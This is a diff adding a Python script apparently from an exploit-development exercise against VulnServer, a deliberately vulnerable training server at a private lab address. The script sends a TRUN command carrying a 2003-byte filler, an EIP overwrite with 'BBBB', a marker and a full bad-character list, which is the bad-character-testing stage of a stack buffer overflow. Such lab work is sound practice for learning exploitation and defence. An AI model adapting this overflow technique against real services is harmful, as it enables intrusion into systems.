@@ -1,0 +1,35 @@
+import socket
+
+# Target details
+target_IP = "192.168.1.135"
+port = 9999
+
+# --- Helpers ---
+def generate_badchars(exclude=b"\x00"):
+    """Generate a sequence of bytes from 0x01 to 0xFF,
+       excluding anything in 'exclude'."""
+    return bytes([b for b in range(0x01, 0x100) if bytes([b]) not in exclude])
+
+def send_payload(payload):
+    """Send the payload to VulnServer."""
+    try:
+        print("[*] Connecting to target...")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_IP, port))
+        s.send(b"TRUN /.:/" + payload)
+        print("[*] Payload sent.")
+        s.close()
+    except Exception as e:
+        print("[!] Connection failed:", e)
+
+# --- Payload build ---
+offset = 2003               # EIP overwrite offset
+filler = b"A" * offset
+eip    = b"B" * 4           # Overwrite EIP with 42424242
+marker = b"C" * 4           # Easy-to-find marker after EIP
+badchars = generate_badchars(b"\x00")  # Start by excluding only null
+
+inputBuffer = filler + eip + marker + badchars
+
+# --- Fire it off ---
+send_payload(inputBuffer)
